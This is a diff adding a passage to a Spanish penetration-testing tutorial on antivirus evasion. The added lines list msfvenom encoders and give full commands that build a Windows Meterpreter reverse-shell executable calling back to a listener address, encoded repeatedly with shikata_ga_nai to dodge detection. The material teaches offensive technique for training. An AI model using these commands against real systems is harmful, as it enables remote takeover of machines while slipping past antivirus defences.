@@ -123,6 +123,24 @@ Esta técnica dejó de ser tan efectiva porque los antivirus modernos ya no depe
 
 Además, muchos encoders clásicos de herramientas como Metasploit se hicieron muy conocidos. Los fabricantes de seguridad acabaron añadiendo firmas para el payload original y el shellcode descodificado.
 
+Para ver los encoders disponibles en msfvenom:
+
+```bash
+msfvenom --list encoders
+```
+
+Para usarlo en un payload basta con añadir la opción `-e` a la orden que usamos para crear el payload:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.1.45 LPORT=1234 -e x86/shikata_ga_nai -o payload.exe
+```
+
+Para dificultar algo más la detección del payload a los antivirus podemos usar las iteraciones. Estas iteraciones son el número de veces que se aplica una codificación al payload. No es recomendable aplicar más de 10 porque no supone una mejora significativa.
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.1.45 LPORT=1234 -e x86/shikata_ga_nai -i 10 -o payload.exe
+```
+
 ## 4.3. Inyección de payloads en ejecutables Windows
 
 [⟵ Anterior](03_shells.md) | [Siguiente ⟶](05_windows.md)
